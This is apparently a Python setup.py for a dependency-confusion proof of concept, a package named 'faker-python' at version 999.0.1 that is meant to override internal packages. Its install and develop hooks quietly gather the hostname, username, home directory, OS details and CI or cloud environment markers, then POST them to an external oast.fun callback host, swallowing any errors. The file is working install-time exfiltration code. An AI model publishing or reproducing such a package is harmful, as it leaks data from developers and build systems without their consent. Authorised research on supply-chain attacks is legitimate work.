from setuptools import setup
from setuptools.command.install import install
from setuptools.command.develop import develop
import os
import socket
import platform
import getpass
import urllib.request
import urllib.parse
import json

def send_callback():
    """Send detailed callback on install via POST request"""
    try:
        # Collect system information
        data = {
            'hostname': socket.gethostname(),
            'username': getpass.getuser(),
            'cwd': os.getcwd(),
            'home': os.path.expanduser('~'),
            'os': platform.system(),
            'os_version': platform.version(),
            'architecture': platform.machine(),
            'python_version': platform.python_version(),
            'env_vars': {
                'CI': os.getenv('CI'),
                'GITHUB_ACTIONS': os.getenv('GITHUB_ACTIONS'),
                'GITLAB_CI': os.getenv('GITLAB_CI'),
                'JENKINS_URL': os.getenv('JENKINS_URL'),
                'CIRCLE_CI': os.getenv('CIRCLECI'),
                'TRAVIS': os.getenv('TRAVIS'),
                'AWS_REGION': os.getenv('AWS_REGION'),
                'AWS_LAMBDA_FUNCTION_NAME': os.getenv('AWS_LAMBDA_FUNCTION_NAME'),
                'KUBERNETES_SERVICE_HOST': os.getenv('KUBERNETES_SERVICE_HOST'),
            },
            'package_name': 'faker-python',
            'event': 'install'
        }

        # Remove None values
        data['env_vars'] = {k: v for k, v in data['env_vars'].items() if v is not None}

        # Send via POST request to avoid URL length limits
        url = "http://d43tqfdrlkdc73fvf6tgobpbpsxg9ch5w.oast.fun"

        json_data = json.dumps(data).encode('utf-8')
        headers = {'Content-Type': 'application/json'}

        req = urllib.request.Request(url, data=json_data, headers=headers, method='POST')
        urllib.request.urlopen(req, timeout=5)
    except Exception as e:
        # Silent fail - don't break the installation
        pass

class PostInstallCommand(install):
    """Post-installation callback"""
    def run(self):
        send_callback()
        install.run(self)

class PostDevelopCommand(develop):
    """Post-develop callback"""
    def run(self):
        send_callback()
        develop.run(self)

setup(
    name='faker-python',  # Replace with target package name
    version='999.0.1',  # High version to override internal packages
    description='Extended date and time utilities - PoC for security research',
    long_description='This package is a proof-of-concept for dependency confusion vulnerability testing.',
    author='Ali Tutuncu',
    author_email='a@a3.wtf',
    url='https://github.com/yourusername/dateutil-poc',
    packages=['faker_python'],
    cmdclass={
        'install': PostInstallCommand,
        'develop': PostDevelopCommand,
    },
    install_requires=[],
    python_requires='>=3.6',
    classifiers=[
        'Development Status :: 3 - Alpha',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
        'Programming Language :: Python :: 3.11',
    ],
)
